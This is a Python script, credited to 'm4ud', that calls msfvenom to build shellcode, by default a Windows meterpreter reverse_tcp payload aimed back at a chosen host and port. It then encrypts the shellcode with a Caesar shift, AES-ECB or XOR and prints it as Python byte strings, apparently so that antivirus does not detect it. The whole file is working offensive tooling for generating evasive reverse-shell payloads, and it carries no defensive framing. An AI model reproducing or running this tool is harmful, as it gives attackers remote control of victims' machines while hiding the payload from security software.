# (m4ud)
import subprocess
import argparse
from Crypto.Cipher import AES
from Crypto.Util import Padding


def caesar_encrypt(shellcode, key):
    key = int(key)
    encrypted_shellcode = bytearray()
    for b in shellcode:
        encrypted_b = (b + key) % 256
        #encrypted_b = b + key
        encrypted_shellcode.append(encrypted_b)
    print("Caesar Cipher enc for py shellcode")
    print("\r\nShellcode size: "+ str(len(encrypted_shellcode))+ "\r\n")
    return encrypted_shellcode


def aes_encrypt(shellcode, key):
    key = key.encode()
    # Pad the key to the correct length
    key = key.ljust(16, b'\x00')
    while len(key) < 16:
        key += b'\x00'
    cipher = AES.new(key, AES.MODE_ECB)
    shellcode = Padding.pad(shellcode, AES.block_size)
    encrypted_shellcode = bytearray(cipher.encrypt(shellcode))
    print("AES enc for py shellcode")
    print("\r\nShellcode size: "+ str(len(encrypted_shellcode))+ "\r\n")
    return encrypted_shellcode


def xor_encrypt(shellcode, key):
    key = key.encode()
    encrypted_shellcode = bytearray()
    for i, c in enumerate(shellcode):

        if i % 2 == 0:
            z = shellcode[i:i+2]
            x = int(z, base=16)
            encrypted_shellcode.append(x ^ int(key))
            # better enc(todo)
            #encrypted_shellcode.append(x ^ int(str(key[i % len(key)]), 16))
    print("m4ud xor enc for py shellcode")
    print("\r\nShellcode size: "+ str(len(encrypted_shellcode))+ "\r\n")
    return encrypted_shellcode

def main():
    parser = argparse.ArgumentParser(description='Wrapper for msfvenom')
    parser.add_argument('-p', '--payload', required=True, help='The payload to be generated', nargs='?', default="windows/x64/meterpreter/reverse_tcp")
    parser.add_argument('-e', '--encryption', required=False, help='Encryption method')
    parser.add_argument('-k', '--key', required=False, help='Key for encryption')
    parser.add_argument('-lhost', '--lhost', required=True, help='The target IP')
    parser.add_argument('-lport', '--lport', required=True, help='The target port')
    args = parser.parse_args()

    msfvenom_output = subprocess.run(['msfvenom', '-p', args.payload, '-f', 'python','-v','shellcode', '-a', 'x86', 'LHOST='+args.lhost, 'LPORT='+args.lport], capture_output=True)
    shellcode = msfvenom_output.stdout.decode().strip(" ")

    if args.encryption != None:
        shellcode += "\""
        shellcode = shellcode.replace("\" +\n\"", "")
        shellcode = shellcode.replace("shellcode =  b\"", "")
        shellcode = shellcode.replace("\"\n\"","")
        shellcode = shellcode.replace("\"\nshellcode += b\"", "")
        shellcode = shellcode.replace("\\x","")


    if args.encryption == 'rot' and args.key:
        shellcode = bytearray.fromhex(shellcode)
        encrypted_shellcode = caesar_encrypt(shellcode, args.key)
        print("EncShellcode = b", end="")
        print("\"", end="")
        for i, b in enumerate(encrypted_shellcode):
            print("\\x%02x" % b, end="")
            if (i+1) % 15 == 0:
                print("\"")
                print("EncShellcode += b\"", end="")
        print("\"")


    if args.encryption == 'aes' and args.key:
        shellcode = bytearray.fromhex(shellcode)
        encrypted_shellcode = aes_encrypt(shellcode, args.key)
        #print(shellcode)
        print("EncShellcode = b", end="")
        print("\"", end="")
        for i, b in enumerate(encrypted_shellcode):
            print("\\x%02x" % b, end="")
            if (i+1) % 15 == 0:
                print("\"")
                print("EncShellcode += b\"", end="")
        print("\"")


    if args.encryption == 'xor':
        shellcode = bytearray(shellcode.encode())
        encrypted_shellcode = xor_encrypt(shellcode, args.key)
        #print(shellcode)
        print("EncShellcode = b", end="")
        print("\"", end="")
        for i, b in enumerate(encrypted_shellcode):
            print("\\x%02x" % b, end="")
            if (i+1) % 15 == 0:
                print("\"")
                print("EncShellcode += b\"", end="")
        print("\"")


    if args.encryption == None:
        if isinstance(shellcode, bytes):
            shellcode = shellcode.replace(b'shelcode =',b'OShellcode = ')
        else:
            shellcode = shellcode.replace('shelcode =','OShellcode = ')
            print(shellcode)

if __name__ == '__main__':
    main()

